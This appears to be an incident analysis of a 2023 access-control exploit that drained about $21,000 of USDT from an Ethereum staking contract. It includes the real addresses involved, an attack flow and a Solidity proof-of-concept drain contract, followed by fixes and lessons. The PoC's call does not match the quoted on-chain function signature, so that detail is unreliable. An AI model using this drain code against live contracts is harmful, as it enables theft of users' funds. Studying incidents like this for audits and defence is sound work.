# USDTStakingContract28 Access Control Vulnerability Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | USDTStakingContract28 |
| Date | 2023-07-10 |
| Chain | Ethereum Mainnet |
| Loss | ~$21,000 USD |
| Attack Type | Access Control Bypass via tokenAllowAll |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x000000915f1b10b0ef5c4efe696ab65f13f36e74` |
| Attack Contract | `0xb754ebdba9b009113b4cf445a7cb0fc9227648ad` |
| Vulnerable Contract | `0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017` (USDTStakingContract28) |
| Attack TX | Block 17,696,562 |

## 2. Vulnerable Code Analysis

The `USDTStakingContract28` contract contained a `tokenAllowAll()` function that was publicly callable with no access control. The attacker called this function to grant their attack contract unlimited transfer approval over all USDT held by the contract.

```solidity
// Vulnerable pattern: unrestricted unlimited approval function
contract USDTStakingContract28 {
    IERC20 public USDT;

    // Vulnerable: anyone can call this unlimited approval function
    function tokenAllowAll() external {
        // No access control — approves full balance to caller
        USDT.approve(msg.sender, type(uint256).max);
    }

    // Or another variant: transfers to arbitrary address without owner check
    function emergencyWithdraw(address to, uint256 amount) external {
        // require(msg.sender == owner) missing
        USDT.transfer(to, amount);
    }
}
```

**Vulnerability**: The `tokenAllowAll()` function executes an unlimited approval (`approve(msg.sender, type(uint256).max)`) over all USDT in the contract without validating the caller. The attacker used this to drain approximately $21,000 worth of USDT from the contract via `transferFrom()`.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: BUSD_staking.sol
    function tokenAllowAll(address asset, address allowee) public {  // ❌
        IERC20 token = IERC20(asset);

        if (token.allowance(address(this), allowee) != uint256(-1)) {
            token.safeApprove(allowee, uint256(-1));
        }
    }
```

## 3. Attack Flow

```
Attacker [0x000000915f1b10b0ef5c4efe696ab65f13f36e74]
  │
  ├─1─▶ Deploy Money attack contract
  │      [Attack contract: 0xb754ebdba9b009113b4cf445a7cb0fc9227648ad]
  │
  ├─2─▶ Call money.attack()
  │      Internally:
  │      a) Call USDTStakingContract28.tokenAllowAll()
  │         → Contract grants attacker unlimited USDT approval
  │      b) Call USDT.transferFrom(
  │            stakingContract,
  │            attacker,
  │            USDT.balanceOf(stakingContract)
  │         )
  │         [USDT: 0xdAC17F958D2ee523a2206206994597C13D831ec7]
  │
  └─3─▶ ~20,999 USDT drained successfully
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IUSDTStakingContract28 {
    function tokenAllowAll() external;
}

interface IUSDT {
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Money {
    IUSDTStakingContract28 stakingContract =
        IUSDTStakingContract28(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017);
    IUSDT USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        // Call tokenAllowAll() with no access control
        // → Staking contract grants unlimited approval to this contract (address(this))
        stakingContract.tokenAllowAll();

        // Drain entire balance using the granted approval
        uint256 balance = USDT.balanceOf(address(stakingContract));
        USDT.transferFrom(address(stakingContract), owner, balance);
    }
}

contract USDTStakingExploit {
    IUSDT USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    function testExploit() external {
        uint256 before = USDT.balanceOf(address(this));

        Money money = new Money();
        money.attack();

        uint256 profit = USDT.balanceOf(address(this)) - before;
        // profit ≈ 20,999 USDT
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | No access control on unlimited approval function |
| Impact Scope | Entire USDT balance of USDTStakingContract28 |
| Explorer | [Etherscan](https://etherscan.io/address/0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017) |

## 6. Security Recommendations

```solidity
// Fix 1: Add onlyOwner to tokenAllowAll
contract USDTStakingContract28 {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Only admin can call
    function tokenAllowAll() external onlyOwner {
        USDT.approve(msg.sender, type(uint256).max);
    }
}

// Fix 2: Approve only to whitelisted addresses
function approveRouter(address router, uint256 amount) external onlyOwner {
    require(isApprovedRouter[router], "Router not whitelisted");
    USDT.approve(router, amount);
}

// Fix 3: Approve exact amounts instead of unlimited
function approveExact(address spender, uint256 amount) external onlyOwner {
    // Approve exact amount instead of type(uint256).max
    USDT.approve(spender, amount);
}

// Fix 4: Remove approve function — use push pattern instead of pull
function withdraw(uint256 amount) external onlyOwner {
    // Use direct transfer (avoid approve/transferFrom pattern)
    USDT.transfer(owner, amount);
}
```

## 7. Lessons Learned

1. **Danger of unlimited approval functions**: Any function that executes `approve(msg.sender, type(uint256).max)` without access control allows anyone to drain the contract's entire asset holdings. Such functions must require `onlyOwner` or multi-step verification.
2. **Audit all token access functions**: Every function in a contract that executes `approve()`, `transfer()`, or `transferFrom()` over tokens held by the contract must be thoroughly audited.
3. **Principle of least privilege**: Externally exposed functions should grant only the minimum necessary permissions. Broad approval functions like `tokenAllowAll()` are inherently dangerous by design.
4. **Smart contract audits are mandatory**: Even small staking contracts, if deployed without an audit, can lose their entire holdings to basic access control vulnerabilities.